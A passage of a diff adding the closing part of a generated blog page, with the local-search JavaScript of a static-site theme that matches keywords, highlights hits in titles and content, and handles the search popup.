+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
